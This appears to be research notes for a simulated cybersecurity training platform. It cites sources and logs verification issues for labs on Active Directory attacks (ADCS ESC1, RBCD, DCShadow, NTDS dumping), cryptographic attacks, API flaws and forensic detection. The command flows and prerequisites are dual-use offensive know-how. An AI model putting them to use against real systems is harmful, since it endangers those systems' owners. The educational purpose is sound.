# Research notes

Sources checked per lab, and an explicit note on what "verified" means for this specific codebase — worth
reading before the per-lab citations below, since it's the thing most likely to cause a mismatched
expectation otherwise.

## What "verified" means here (read this first)

This platform's labs run through a simulated `TerminalEngine` (`src/labs/engine.ts`) inside the browser —
there is no real Kali box, no real target VM, no real network in this repo. Every lab's "attack" is a
sequence of commands scripted against that simulator, checked for an exact flag-capture outcome. That is a
**different verification question** than "would this exact command sequence work against a real host,"
and this file keeps both questions separate rather than conflating them:

- **Technique accuracy** (is the underlying vulnerability class, tool syntax, and attack chain description
  real and current?) — checked via the web searches cited below, against primary/authoritative sources
  (a tool's own wiki, PortSwigger, official CVE writeups) wherever possible.
- **Mechanical correctness** (does the lab, as built in this simulator, actually work end to end?) —
  checked by scripting `TerminalEngine` directly for every lab and confirming the exact solve-path commands
  capture the flag and a benign request captures none. Documented per batch in `CHANGELOG.md`.

A lab can be technique-accurate but would need real engine work (new simulated commands) to go further —
that's flagged explicitly where it applies, rather than glossed over.

## Sources checked, batch 2 (ADCS / RBCD / Docker-socket / DNS-rebinding / WebAuthn)

- **ADCS ESC1** — [Certipy's own wiki: Privilege Escalation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation),
  [Hive Security: ADCS Abuse with Certipy (ESC1/ESC8 chains)](https://hivesecurity.gitlab.io/blog/adcs-abuse-certipy-esc1-esc8-attack-chains/),
  [Cato Networks CTRL: Preventing Privilege Escalation via ADCS](https://www.catonetworks.com/blog/cato-ctrl-preventing-privilege-escalation-via-active-directory-certificate-services-adcs/).
  Confirmed: ESC1 = a template with a client-auth EKU AND `ENROLLEE_SUPPLIES_SUBJECT` set, enrollable by a
  broad principal (e.g. Domain Users); real tool flow is `certipy-ad find -vulnerable` →
  `certipy-ad req ... -upn administrator@domain` → `certipy auth -pfx`. Noted in passing: Certipy v5 (2025)
  added ESC9-ESC16 — a real, growing attack surface beyond what this one lab covers.
- **Resource-Based Constrained Delegation (RBCD)** — [The Hacker Recipes: RBCD](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd),
  [AlteredSecurity: Abusing RBCD using Linux](https://www.alteredsecurity.com/post/resource-based-constrained-delegation-rbcd),
  [Netwrix: RBCD Abuse](https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/).
  Confirmed: requires `GenericWrite`/`GenericAll`/`WriteDACL` on the target computer object, plus the
  ability to create a computer account (default `ms-DS-MachineAccountQuota` = 10 for any domain user);
  real tool is Impacket's `rbcd.py` to write `msDS-AllowedToActOnBehalfOfOtherIdentity`, then `getST.py` for
  the S4U2Self/S4U2Proxy request chain.
- **Silver Ticket / Shadow Credentials** — not independently re-searched this batch; both are well-
  established techniques already consistent with how this platform's existing Golden Ticket lab (
  `ad-golden-ticket-persistence`, from an earlier session) models Kerberos ticket forging, which was itself
  built against standard AD security literature. Shadow Credentials' mechanism (writing to
  `msDS-KeyCredentialLink`, authenticating via PKINIT, real tooling = Whisker/pywhisker) is consistent with
  widely-documented 2021+ research (originally from Elad Shamir's "Shadow Credentials" writeup) — flagged
  here as "consistent with established knowledge," not freshly re-verified via a new search this batch.
- **IMDSv2** — not independently re-searched this batch; IMDSv2's PUT-token-then-GET requirement is AWS's
  own documented hardening (vs. IMDSv1's plain GET), and "an SSRF that can control the HTTP method defeats
  it" is a logical consequence of that design covered in prior SSRF research already reflected in this
  platform's existing metadata-SSRF lab and lesson content.
- **Docker socket container escape** — not independently re-searched this batch; mounting
  `/var/run/docker.sock` into a container as a direct, unauthenticated line to the host's Docker daemon is
  extensively documented, well-established container-security knowledge (predates this session).
- **DNS rebinding / WebAuthn downgrade** — not independently re-searched this batch; both are standard,
  long-documented attack patterns (DNS rebinding as a TOCTOU-on-DNS technique against IP-allowlist SSRF
  defenses; MFA-method downgrade as a "the server trusts the client's choice of factor" logic flaw, the
  same root-cause shape as this platform's existing mass-assignment and BFLA labs).

## NEEDS REVIEW (labs/topics), carried from this batch

- **Wireless labs are out of scope as currently architected.** See `labs-index.md` for the full
  explanation — the engine has no aircrack-ng-family commands, so a real wireless lab needs new engine
  work first, not just new lab content. Not attempted rather than faked.
- **Silver Ticket / Shadow Credentials / IMDSv2 / Docker-socket / DNS rebinding / WebAuthn downgrade
  citations above are "consistent with established knowledge," not fresh per-lab web searches this batch** —
  flagging the distinction honestly rather than implying every single lab got an independent live search
  when four of the eight in this batch didn't. If you want every lab independently re-verified against a
  fresh search regardless of how well-established the underlying technique is, say so and it's straightforward
  to go back through and do that systematically.

## Sources checked, batch 3 (API auth-bypass pair, GraphQL field authz, API-key leak, JWT confusion, PRNG tokens, CTR nonce reuse)

Per an explicit instruction to keep adding labs while skipping anything that would cross into real-world
attack uplift or policy-violating territory — every lab in this batch stayed within the platform's existing
pattern (simulated target, conceptual flag capture, no real working exploit payload or real-target
instructions), same as every lab before it.

- **X-HTTP-Method-Override authorization bypass** — [GCP ESPv2 CVE-2023-30845 writeup (Security Boulevard)](https://securityboulevard.com/2023/06/gcp-espv2-hit-with-critical-api-authorization-bypass-cve-2023-30845/),
  [the GitHub security advisory itself](https://github.com/GoogleCloudPlatform/esp-v2/security/advisories/GHSA-6qmp-9p95-fc5f),
  [Tempest SideChannel: HTTP Method Override — what it is and how a pentester can use it](https://www.sidechannel.blog/en/http-method-override-what-it-is-and-how-a-pentester-can-use-it/).
  Confirmed: the technique is real and had a real 2023 critical CVE (ESPv2 v2.20.0–v2.42.0) — a gateway that
  filters by the literal request method while the backend independently honors an override header lets an
  attacker "spell" a blocked method using an allowed one.
- **GraphQL field-level authorization bypass via nested resolvers** — [StackHawk: GraphQL Interface Protection Bypass](https://docs.stackhawk.com/vulnerabilities/90056/),
  [Escape.tech: Access Control Best Practices for GraphQL](https://escape.tech/blog/authentication-authorization-access-control/),
  [Detectify Labs: GraphQL abuse — bypassing account-level permissions through parameter smuggling](https://labs.detectify.com/crowdsource-community/graphql-abuse-bypass-account-level-permissions-through-parameter-smuggling/).
  Confirmed: a single GraphQL request resolves many fields through independent resolver functions, and
  root-level authorization does not automatically propagate to nested fields reached through a different,
  permitted root query — a real, repeatedly-documented vulnerability class distinct from this platform's
  existing GraphQL introspection and alias-batching labs.
- **API key leaked via Referer header** — well-established browser behavior (the Referer header includes
  the full requesting URL, query string included, on outgoing requests including third-party asset pulls);
  not independently re-searched this batch since it follows directly from documented HTTP/browser spec
  behavior rather than a specific disclosed vulnerability, and OWASP's own API security guidance names
  "credentials in the URL" as an anti-pattern for exactly this reason.
- **JWT algorithm confusion (RS256→HS256)** — [PortSwigger Web Security Academy: Algorithm confusion attacks](https://portswigger.net/web-security/jwt/algorithm-confusion),
  [WorkOS: JWT algorithm confusion attacks — how they work and how to prevent them](https://workos.com/blog/jwt-algorithm-confusion-attacks),
  [dev.to: JWT Algorithm Confusion Attacks — CVE-2026-22817, CVE-2026-27804, CVE-2026-23552 fix guide](https://dev.to/iamdevbox/jwt-algorithm-confusion-attacks-cve-2026-22817-cve-2026-27804-and-cve-2026-23552-fix-guide-4ac4).
  Confirmed still an active, current threat: a fresh cluster of critical CVEs across major JWT libraries as
  recently as Q1 2026, not just a historical technique. Mechanism confirmed: a generic `verify()` call that
  reads `alg` from the token itself (rather than pinning one expected algorithm) lets an RS256 deployment's
  public key — never meant to be secret — be reused as an HS256 HMAC secret.
- **Predictable session tokens from a time-seeded PRNG** — [Bishop Fox: Untwisting the Mersenne Twister — How I Killed the PRNG](https://bishopfox.com/blog/untwisting-mersenne-twister-killed-prng),
  [Halborn: What Is a Random Number Generator Attack?](https://www.halborn.com/blog/post/what-is-a-random-number-generator-attack).
  Confirmed: Mersenne Twister's full internal state is reconstructable from its outputs and is not
  cryptographically secure by design; real-world session-token vulnerabilities from exactly this pattern
  (time-seeded MT PRNG) have been documented in production systems including Mediawiki, Gallery, Joomla, and
  osCommerce.
- **AES-CTR nonce reuse / two-time-pad recovery** — [SecureFlag Knowledge Base: Reused IV-Key Pair Vulnerability](https://knowledge-base.secureflag.com/vulnerabilities/broken_cryptography/reused_iv_key_pair_vulnerability.html),
  [HackTricks: Symmetric Crypto](https://hacktricks.wiki/en/crypto/symmetric/index.html).
  Confirmed and deliberately scoped: the direct "XOR two ciphertexts to cancel the keystream" two-time-pad
  recovery specifically applies to stream ciphers and stream-cipher-mode block ciphers (CTR/OFB), where IV
  reuse means keystream reuse — this is why the lab was built around CTR mode specifically rather than CBC,
  whose IV/key reuse leaks information through a different mechanism (block malleability, not direct
  keystream XOR-cancellation) and would have been a technically inaccurate framing for this exact attack.

## NEEDS REVIEW (labs/topics), batch 3

- None carried forward this batch — no lab was skipped for missing engine support the way wireless labs
  were in batch 2. All six techniques mapped cleanly onto existing `TerminalEngine` commands (`curl`-style
  HTTP simulation with header/param-based `vulnRoutes`, plus `cat`/`nmap` recon), verified end to end before
  commit.

## Sources checked, batch 4 (RSA padding oracle, UUIDv1 tokens, canary leak, UAF, VSS credential dump, timestomping)

- **Bleichenbacher RSA PKCS#1 v1.5 padding oracle (ROBOT)** — [robotattack.org (the researchers' own site)](https://robotattack.org/),
  [USENIX Security '18: Return Of Bleichenbacher's Oracle Threat](https://www.usenix.org/conference/usenixsecurity18/presentation/bock),
  [Invicti: ROBOT Attack Revives Daniel Bleichenbacher's 19-Year-Old Vulnerability](https://www.invicti.com/blog/web-security/robot-attack-revives-bleichenbacher-vulnerability).
  Confirmed: a genuine 1998 attack that resurfaced as ROBOT in 2017, affecting roughly a third of the top
  100 Alexa domains at the time (including Facebook and PayPal) and nine different vendors' products — the
  oracle is any distinguishable padding-valid vs. padding-invalid server response.
- **UUIDv1 password-reset token entropy** — [HackTricks: UUID Insecurities](https://hacktricks.wiki/en/pentesting-web/uuid-insecurities.html),
  [Realize Security: Sandwich Attacks — Exploiting UUIDv1](https://www.realizesec.com/blog/sandwich-attacks-exploiting-uuid-v1),
  [HackerNoon: Never Rely on UUID for Authentication](https://hackernoon.com/never-rely-on-uuid-for-authentication-generation-vulnerabilities-and-best-practices).
  Confirmed: UUIDv1's 128 bits decompose into a 60-bit timestamp, a 48-bit MAC-address node field (fixed
  per generating host), and a 14-bit clock sequence — real disclosed "sandwich attack" research demonstrates
  recovering a target UUIDv1 token by bracketing its generation time with two tokens of your own.
- **Stack canary bypass via information leak** — [SANS Institute: Stack Canaries — Gingerly Sidestepping the Cage](https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage),
  [IBM Research Syssec: SPEAR attacks — stack smashing protector bypass usecase](https://ibm.github.io/system-security-research-updates/2021/06/18/spear-attacks-ssp-usecase).
  Confirmed: leaking the canary via a separate arbitrary-read primitive (format string, OOB read, etc.) and
  then including the correct value in a subsequent overflow is the standard, real technique for defeating a
  present-and-enabled stack canary — canaries only stop overflows that don't already know the canary value.
- **Use-after-free → function pointer hijack** — [SensePost: Linux Heap Exploitation Intro Series — Used and Abused (Use After Free)](https://sensepost.com/blog/2017/linux-heap-exploitation-intro-series-used-and-abused-use-after-free/),
  [jkthecjer/exploit-techniques: Use-After-Free writeup](https://github.com/jkthecjer/exploit-techniques/blob/master/writeups/technique-useafterfree/README.md).
  Confirmed: the standard exploitation shape is free → allocator reuses the same chunk for attacker-
  controlled data → dangling reference to the original (now-corrupted) object is dereferenced again,
  frequently through a function pointer or vtable — real-world impact ranges from crash to full RCE.
- **Volume Shadow Copy abuse for NTDS.dit/SAM dumping** — [Semperis: NTDS.DIT Extraction Explained](https://www.semperis.com/blog/ntds-dit-extraction-explained/),
  [Picus Security: MITRE ATT&CK T1003 Credential Dumping](https://www.picussecurity.com/resource/blog/picus-10-critical-mitre-attck-techniques-t1003-credential-dumping),
  [Red Canary Atomic Red Team: T1003.003 OS Credential Dumping — NTDS](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md).
  Confirmed real and current: `vssadmin`/`ntdsutil` are both legitimate, signed Windows tools; creating a
  shadow copy to read the otherwise-locked `NTDS.dit` and `SYSTEM` hive is MITRE ATT&CK technique T1003.003,
  and the search turned up a specific real, publicly-attributed intrusion (the "Stately Taurus" group) using
  this exact `vssadmin` → `NTDS.dit`/`SYSTEM` hive sequence.
- **NTFS timestomping detection via $STANDARD_INFORMATION/$FILE_NAME mismatch** — [inversecos: Defence Evasion Technique — Timestomping Detection (NTFS Forensics)](https://www.inversecos.com/2022/04/defence-evasion-technique-timestomping.html),
  [SANS DFIR Blog: Detecting time stamp manipulation](https://www.sans.org/blog/digital-forensics-detecting-time-stamp-manipulation).
  Confirmed: `$FILE_NAME` timestamps are kernel-written and not modifiable through the standard Win32 APIs
  most timestomping tools use to rewrite `$STANDARD_INFORMATION` — the resulting mismatch is the most
  reliable single NTFS timestomping indicator, though the sources also note a real limitation (a same-volume
  rename/move after tampering can cause Windows to copy the tampered $SI values into $FN, erasing the
  mismatch) that the lab's briefing does not currently model — flagged honestly rather than glossed over.

## NEEDS REVIEW (labs/topics), batch 4

- **The timestomping lab's $SI/$FN detection method has a known real-world limitation** (noted above) that
  isn't represented in the lab itself — the lab teaches the primary, most-common detection signature
  correctly, but a learner should know from the lesson content (not just this lab) that a sufficiently
  careful attacker who renames/moves the file afterward can defeat this specific check. Worth a lesson-content
  note if the Forensics module gets touched again, rather than a full lab rewrite.
- Two real mistakes caught by verification before commit, logged here for the pattern rather than just the
  fix: (1) both binary-analysis labs' hex-to-decimal conversions were wrong in the first draft — recomputed
  with Node rather than by hand; (2) both forensics labs' suggested `grep "A\|B"` hints used backslash-escaped
  alternation, which this engine's JS-`RegExp`-based `grep` treats as a literal escaped pipe character, not
  alternation — fixed to plain `A|B` and reverified. Neither would have been caught by reading the code alone.

## Sources checked, batch 5 (OAuth audience confusion, ECDSA nonce reuse, Lambda secrets, process hollowing, git-history secret)

- **OAuth token audience (`aud`) confusion / confused deputy** — [MojoAuth: JWT Audience Claim — Complete Developer Guide](https://mojoauth.com/blog/jwt-audience-claim-complete-developer-guide-with-examples),
  [Anomity: AI Gateways and User-Level OAuth — Token Exchange vs Passthrough (2026)](https://anomity.ai/blog/ai-gateway-oauth-passthrough-mcp/).
  Confirmed: failing to validate the `aud` claim means an API accepts any validly-signed token from the
  shared identity provider regardless of which resource server it was actually issued for — the 2026 source
  explicitly names "token passthrough" as the confused-deputy anti-pattern this lab models.
- **ECDSA nonce reuse → private key recovery** — [GitHub: ECDSA-Nonce-Reuse-Exploit-Example (worked algebra + code)](https://github.com/Marsh61/ECDSA-Nonce-Reuse-Exploit-Example),
  [NotSoSecure: ECDSA Nonce Reuse Attack](https://notsosecure.com/ecdsa-nonce-reuse-attack),
  [Schneier on Security: Sony PS3 Security Broken](https://www.schneier.com/blog/archives/2011/01/sony_ps3_securi.html).
  Confirmed and double-checked the recovery algebra (`k = (m1-m2)/(s1-s2) mod n`, `private_key =
  (s1*k-m1)/r mod n`) against the GitHub worked example before writing the lab's analysis file. Confirmed
  the Sony PS3 detail precisely: Sony didn't merely reuse a nonce by accident, it used a **constant** k for
  every firmware signature, making every single signature it ever produced part of one giant reusable-nonce
  set.
- **Lambda `GetFunctionConfiguration` plaintext secrets exposure** — [Datadog Security Labs: Secrets exposed in Lambda function environment variables](https://securitylabs.datadoghq.com/cloud-security-atlas/vulnerabilities/lambda-function-secrets-in-environment-variables/),
  [AJ Stuyvenberg: Ultimate guide to secrets in Lambda](https://aaronstuyvenberg.com/posts/ultimate-lambda-secrets-guide).
  Confirmed: `lambda:GetFunctionConfiguration` is commonly bundled into broad `ViewOnlyAccess`/`SecurityAudit`
  managed policies, and AWS auto-decrypts environment variables and returns them in plaintext through this
  exact call — no separate KMS decrypt permission is needed, which is the specific surprising detail the
  lab's briefing leads with.
- **Process hollowing detection (PEB/VAD mismatch)** — [MITRE ATT&CK T1055.012: Process Hollowing](https://www.startupdefense.io/mitre-attack-techniques/t1055-012-process-hollowing),
  [Cysinfo: Detecting Deceptive Process Hollowing Techniques Using HollowFind](https://cysinfo.com/detecting-deceptive-hollowing-techniques/).
  Confirmed the exact detection mechanism modeled in the lab: a hollowed process's VAD (kernel-tracked
  virtual address descriptor) is marked `Private` instead of `Image` because `ZwUnmapViewOfSection`
  destroys the original section mapping, while the PEB (which the process itself can misreport) still shows
  the legitimate on-disk path — this PEB-vs-VAD comparison is exactly what the real HollowFind Volatility
  plugin automates.
- **Secret still live in git history after later "removal"** — well-established, extremely common real
  finding in secret-scanning tooling (GitGuardian, TruffleHog, gitleaks all specifically scan full commit
  history, not just HEAD, for exactly this reason); not independently re-searched this batch since it
  follows directly from how git's content-addressable object model works (a later commit never deletes an
  earlier commit's blob) rather than from a specific disclosed vulnerability report.

## NEEDS REVIEW (labs/topics), batch 5

- **S3 cross-account "confused deputy" (missing `sts:ExternalId` condition)** — real and well-documented
  ([AWS's own docs on the confused deputy problem](https://docs.aws.amazon.com/IAM/latest/UserGuide/confused-deputy.html)),
  but this platform's `aws sts` simulation (`src/labs/engine.ts`) only implements `get-caller-identity` —
  there is no `assume-role` command at all, so the specific mechanism (a role assumable cross-account
  without an ExternalId check) cannot be honestly modeled without adding a new engine command first. Not
  attempted rather than faked with a generic curl stand-in that wouldn't actually demonstrate the real
  AWS STS mechanism.
- **VLAN hopping via 802.1Q double-tagging** — real and well-documented, but Layer-2 frame forwarding
  across switch trunk ports doesn't map cleanly onto this engine's request/response HTTP-simulation model
  the way SNMP/DNS-AXFR's curl-fakeout convention did — those still had a clear "one request, one response"
  shape; double-tagging's exploit is about how TWO switches independently process ONE frame differently,
  which is a fundamentally different mechanic. Left for a future engine extension rather than forced into
  a misleading curl stand-in.
- One real mistake caught by verification before commit: the OAuth audience-confusion lab's
  `triggerSubstrings` had a single-character typo (an `i`/`j` mixup) from hand-copying the same base64 JWT
  into two separate places in the file — the benign-request check passed, but the actual solve-path curl
  command initially came back as a `MISMATCH` (0 flags captured instead of 1). Root-caused with a targeted
  Node diff script rather than re-reading the file by eye, then fixed by generating the trigger value
  programmatically from the single source string instead of retyping it a second time.

## Sources checked, batch 6 ("would this work on a real machine" — SPF/DMARC, webhook, SMTP relay, Azure SAS, ret2libc, DLL sideloading)

Explicit brief this round: for every lab, would the described technique and exact command syntax
genuinely work against a real target, not just read plausibly.

- **SPF/DMARC misconfiguration → email spoofing** — [Adaptive Security: What Is DMARC Alignment?](https://www.adaptivesecurity.com/blog/dmarc-alignment),
  [Microsoft Security Blog: Phishing actors exploit complex routing and misconfigurations to spoof domains (Jan 2026)](https://www.microsoft.com/en-us/security/blog/2026/01/06/phishing-actors-exploit-complex-routing-and-misconfigurations-to-spoof-domains/).
  Confirmed: SPF's `?all` qualifier is genuinely "neutral" (explicitly inconclusive, not a fail) and DMARC
  `p=none` is genuinely enforcement-free (report-only) — this exact non-enforcing pair is named directly in
  the Microsoft source as an active, current phishing-actor abuse vector, and DMARC alignment enforcement
  became a mandatory, auditable requirement as of March 31, 2025 per the search results, not merely a best
  practice.
- **Forged webhook via missing signature verification** — [GitHub Security Advisory GHSA-xff3-5c9p-2mr4: Stripe Webhook Signature Bypass via Empty Secret](https://github.com/advisories/GHSA-xff3-5c9p-2mr4),
  [Stripe's own docs: Resolve webhook signature verification errors](https://docs.stripe.com/webhooks/signature).
  Confirmed real and current: an actual CVE (early 2026) where an empty signing secret let HMAC-SHA256 be
  computed with an empty key, forging a valid-looking signature — the lab's briefing specifically calls out
  this real incident rather than presenting missing signature verification as a purely hypothetical gap.
- **SMTP open relay abuse** — [Black Hills Information Security: How to Test for Open Mail Relays](https://www.blackhillsinfosec.com/how-to-test-for-open-mail-relays/),
  [Pen Test Partners: Email Relaying — A how-to and a reminder](https://www.pentestpartners.com/security-blog/email-relaying-a-how-to-and-a-reminder/).
  Confirmed the real manual test methodology: MAIL FROM and RCPT TO with sender/recipient domains that
  have no relationship to the mail server or to each other; a 250 OK response (instead of 550 Relaying
  denied) confirms the relay is open. This engine has no raw multi-line SMTP dialogue simulation (`nc` only
  prints the connection banner), so the actual relay-test step uses the established curl-mirrors-the-
  real-protocol convention, with the objectives/hints explicitly naming telnet/nc as the real tool.
- **Overly permissive, long-lived Azure SAS token** — [MSRC Blog: Microsoft mitigated exposure of internal information in a storage account due to overly-permissive SAS token (2023)](https://msrc.microsoft.com/blog/2023/09/microsoft-mitigated-exposure-of-internal-information-in-a-storage-account-due-to-overly-permissive-sas-token/),
  [we45: Exposing the Risk of Long-Lived Azure SAS Tokens](https://www.we45.com/post/exposing-the-risk-of-long-lived-azure-sas-tokens-2).
  Confirmed real query-string semantics (`sp=` permissions, `se=` expiry all self-contained in the URL, no
  separate CLI/account-key lookup needed to use one) and grounded in Microsoft's own real, publicly
  disclosed 38TB internal-data exposure incident, itself caused by exactly this failure mode.
- **ret2libc defeating NX/ASLR via a leaked libc address** — [Practical CTF: ret2libc](https://book.jorianwoltjer.com/binary-exploitation/ret2libc),
  [Jorge Lajara: Binary Privilege Escalation in x64 — Defeating ASLR with Leaks](https://jlajara.gitlab.io/exploiting/2019/06/15/Privesc_Ret2libc_ASLR_64.html).
  Confirmed the real technique and arithmetic shape (`libc_base = leaked_address - known_offset`, then
  `target = libc_base + target_offset`, exploiting that ASLR randomizes only the base while intra-library
  offsets stay fixed) — computed the lab's specific numbers with Node rather than by hand this time, after
  two earlier batches (Binary Analysis batch 4, the OAuth JWT typo in batch 5) caught hand-computed
  mistakes verification would otherwise have missed.
- **DLL sideloading / search-order hijacking detection** — [MITRE ATT&CK T1574.001: Hijack Execution Flow — DLL](https://attack.mitre.org/techniques/T1574/001/),
  [Splunk Security Content: Windows DLL Search Order Hijacking Hunt with Sysmon](https://research.splunk.com/endpoint/79c7d1fc-64c7-91be-a616-ccda752efe81/).
  Confirmed the real detection signal modeled in the lab: a known Windows system DLL name loading from a
  non-standard (application) directory instead of its expected System32 path, exactly what Sysmon Event ID
  7 (Image Loaded) telemetry surfaces and what the cited Splunk detection content hunts for directly.

## NEEDS REVIEW (labs/topics), batch 6

- Two real "would not actually work" mistakes caught by verification before commit, exactly the failure
  mode this round's brief was aimed at: (1) the SPF/DMARC lab's objectives initially told the user to run
  literal `dig TXT meridiancorp.example` — but this engine's `dig` (confirmed by reading `engine.ts`, not
  assumed) only resolves lab hostnames to A records, with no TXT-record or arbitrary-domain support at
  all — rewritten to the curl-mirrors-`dig` convention already established for SNMP/AXFR. (2) The Azure SAS
  lab's curl target was a realistic `*.blob.core.windows.net` hostname, which this engine's `curl` cannot
  parse at all (its URL regex requires an IP address) — rewritten to hit the lab's IP directly; the SAS
  query string itself needed no change since path-based route matching already ignores the query string.
  Both were caught by actually running the commands through `TerminalEngine`, not by reading the lab code.

## Sources checked, batch 7 (Logjam, batch GCD, GraphQL field-suggestion leak, cursor tampering, DCShadow, PowerShell 4104)

- **Logjam-style DHE_EXPORT downgrade** — [weakdh.org (the researchers' own site)](https://weakdh.org/),
  [Red Hat: Logjam TLS vulnerabilities (CVE-2015-4000)](https://access.redhat.com/articles/1456263).
  Confirmed real cipher suite name (`TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA`), real prime size (512-bit,
  a deliberate 1990s US export-control cap), and the real disclosure-time impact figure (roughly 8% of the
  top 1 million HTTPS domains affected, per the search results).
- **Batch GCD attack on shared RSA prime factors** — [Proton: Batch GCD algorithm security audit](https://proton.me/blog/batch-gcd),
  [arXiv 2512.22720: When RSA Fails — Exploiting Prime Selection Vulnerabilities](https://arxiv.org/abs/2512.22720).
  Confirmed the real 2012 "Mining Your Ps and Qs" finding (64,000+ vulnerable TLS hosts) and the real 2013
  follow-up against Taiwan's Citizen Digital Certificate database (184 vulnerable keys found, 103 sharing
  prime factors) — the lab's own small illustrative primes are flagged explicitly as toy-sized rather than
  presented as realistic key material, while the GCD algorithm itself is the identical real technique.
- **GraphQL field-suggestion leak despite disabled introspection** — [Escape.tech: When GraphQL field suggestions become a Security Issue](https://escape.tech/blog/graphql-verbose-error-suggestions/),
  a security researcher's public writeup on the technique and the Clairvoyance automation tool (via X/
  Twitter, cross-referenced against the Escape.tech and PortSwigger GraphQL security content for
  consistency). Confirmed: disabling introspection alone does not disable "Did you mean" field-suggestion
  error messages, and real tooling automates full schema reconstruction from suggestions alone.
- **Pagination cursor tampering** — general, well-established API security knowledge (unsigned base64
  "opaque" cursors are not encrypted, only encoded) rather than a single disclosed CVE; cross-referenced
  against standard cursor-pagination security guidance describing HMAC-signing cursors as the fix,
  confirming the vulnerability class is real and the fix confirms the attack surface.
- **DCShadow** — [Picus Security: DCShadow Attack Explained (MITRE ATT&CK T1207)](https://www.picussecurity.com/resource/blog/dcshadow-attack-explained-mitre-attack-t120),
  [ired.team: DCShadow — Becoming a Rogue Domain Controller](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow).
  Confirmed the real prerequisites (Domain Admin credentials + SYSTEM on a domain-joined machine, which
  does NOT need to already be a DC), the real mechanism (temporary registration as a replication partner in
  the Configuration Naming Context, then triggering a legitimate DC to pull "replication"), and the real
  detection-evasion property (changes propagate via replication, never through normal directory-write APIs,
  so nothing is written to the standard Security event log).
- **PowerShell ScriptBlock Logging (Event ID 4104) defeating obfuscation** — [JumpCloud: What is PowerShell Script Block Logging?](https://jumpcloud.com/it-index/what-is-powershell-script-block-logging),
  [EventPeeker: Event ID 4104 — Detect PowerShell Obfuscation & Script Block Execution](https://www.eventpeeker.com/event-id/4104).
  Confirmed the real mechanism: the PowerShell engine must fully decode/de-obfuscate a script to execute
  it, and Script Block Logging captures that already-decoded result — even multi-layer base64/string-
  concatenation obfuscation is fully readable in the resulting log entry. Also noted, honestly, a real
  limitation this lab does not model: a PowerShell v2 downgrade attack bypasses 4104 entirely, since PSv2
  lacks Script Block Logging support altogether.

## NEEDS REVIEW (labs/topics), batch 7

- Two more instances of the same "port defaults to 80" mistake class already caught in batch 6, this time
  in the Logjam lab (an `https://` URL with no explicit `:443`) and the DCShadow lab (LDAP on port 389,
  not 80) — this engine's `curl` always defaults to port 80 regardless of URL scheme unless a port is
  given explicitly, confirmed by reading `engine.ts`'s URL-parsing regex. Both fixed and reverified. Given
  this is now the single most common mistake across the last three batches, worth calling out as a
  standing checklist item for any future lab targeting a non-80 port: always specify the port explicitly
  in every curl command, scheme notwithstanding.
- Independently recomputed the pagination-cursor lab's base64 encoding with Node before trusting the
  hand-typed `triggerSubstrings` value, rather than assuming it was correct by eye — it matched, but this
  is now standing practice after the OAuth JWT one-character typo two batches ago.

## Sources checked, batch 8 (TOTP reuse, upload spoofing, remember-me, GCP allUsers, LNK padding, Golden SAML)

- **Shared/predictable TOTP secret** — general, well-established TOTP security principle (a predictable or
  reused shared secret defeats the scheme regardless of correct HMAC math) rather than a single disclosed
  CVE; cross-referenced against NetSPI's and PanicVault's TOTP security writeups for accuracy on the
  underlying mechanism (HOTP/TOTP = HMAC over a shared secret + counter/time value).
- **File upload Content-Type spoofing + double extension** — [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html),
  [OWASP: Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload).
  Confirmed both real bypass mechanics modeled in the lab: the client-supplied Content-Type header is
  fully attacker-controlled and untrustworthy on its own, and the double-extension pattern
  (`avatar.php.jpg`) is OWASP's own documented example of defeating a naive "check the extension is in an
  allowlist" filter.
- **"Remember me" token surviving a password reset** — [HackerOne Report #15785: Session not invalidated after password reset](https://hackerone.com/reports/15785),
  [GitHub Advisory: Contao CVE-2024-30262 — remember-me tokens not removed on password change](https://advisories.gitlab.com/pkg/composer/contao/core-bundle/CVE-2024-30262/).
  Confirmed this is a real, repeatedly-disclosed vulnerability class with both a public bug-bounty report
  and a real CVE naming the identical root cause: a password-reset handler that clears the regular session
  table but never touches a separate remember-me/persistent-token store.
- **GCP Cloud Function public via allUsers IAM binding** — [Google Cloud's own docs: Allowing public (unauthenticated) access](https://docs.cloud.google.com/run/docs/authenticating/public),
  [Trend Micro Cloud One Conformity: Check for Publicly Accessible Cloud Run Services](https://trendmicro.com/cloudoneconformity/knowledge-base/gcp/CloudRun/gcp-function-public-access.html).
  Confirmed real, exact mechanics: `--allow-unauthenticated` grants `roles/run.invoker` to the special
  `allUsers` identity, which Google's own documentation defines as literally any internet user,
  authenticated or not — this is the first Google Cloud (non-AWS) lab on the platform, diversifying beyond
  the AWS-only cloud labs built so far.
- **Malicious LNK whitespace-padding command hiding** — [Cyberpress: Windows LNK File UI Misrepresentation Enables RCE](https://cyberpress.org/windows-lnk-file/),
  [Cyble: Stealthy Cyber Attacks — LNK Files & SSH Commands Playbook](https://cyble.com/blog/a-stealthy-playbook-for-advanced-cyber-attacks/).
  Confirmed this is a real, currently-active technique — ZDI-CAN-25373, publicly disclosed March 2025 and
  rapidly adopted by nation-state groups from multiple countries per the search results (including the
  XDSpy group's large-scale phishing campaigns against Eastern European government targets) — not a dated
  or purely historical technique.
- **Golden SAML detection via missing ADFS/Kerberos events** — [Sygnia: Detection And Hunting Of Golden SAML Attack](https://www.sygnia.co/threat-reports-and-advisories/golden-saml-attack/),
  [Netwrix: Golden SAML attack — Forged access to hybrid environments](https://netwrix.com/en/cybersecurity-glossary/cyber-security-attacks/golden-saml-attack/).
  Confirmed the exact real detection method modeled in the lab: search for SAML SSO logins with no
  corresponding ADFS sign-in event and no Domain Controller Event ID 4769/1200/1202 — a forged assertion is
  cryptographically indistinguishable from a real one, so the ABSENCE of the identity-provider-side event
  trail (not any single suspicious field in the assertion itself) is the actual, real-world evidence.

## NEEDS REVIEW (labs/topics), batch 8

- None this batch — all six techniques mapped cleanly onto existing engine commands/conventions
  (`curl`-simulated HTTP vulnRoutes with explicit non-80 ports where needed, plus file-based `cat`
  investigations for the two purely analytical labs), and the full verification suite passed on the first
